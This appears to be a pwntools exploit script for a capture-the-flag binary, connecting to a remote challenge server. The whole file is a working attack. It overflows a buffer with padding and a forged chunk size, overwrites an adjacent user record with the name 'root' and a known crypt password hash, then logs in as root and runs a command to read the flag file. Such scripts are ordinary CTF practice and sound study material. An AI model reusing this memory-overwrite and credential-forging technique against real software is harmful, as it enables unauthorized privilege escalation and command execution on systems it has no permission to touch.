from pwn import *

elf = context.binary = ELF("./a.out")

if args.GDB:
	# p = gdb.debug(elf.path)
	p = gdb.debug(elf.path, '\n'.join([
		"b *setup+272",
		"c"
	]))
elif args.REMOTE:
	p = remote("pwn.be.ax", 5001)
else:
	p = process(elf.path) 


p.sendline(b'asdfghjk')
p.sendline(b'dupa')  # 13SXbtbMmk2nQ   crypted
p.sendline(b'120')

payload = b'A' * 128
payload += p64(0xc1)
payload += b'B' * (0x28 + 3)
payload += b'root' + b'\x00' * 4
payload += b'13SXbtbMmk2nQ'
p.sendline(payload)

p.sendline(b'1')
p.sendline(b'root')
p.sendline(b'dupa')
p.sendline(b'3')
p.sendline(b'cat flag.txt')

print(p.clean().decode())
p.interactive()
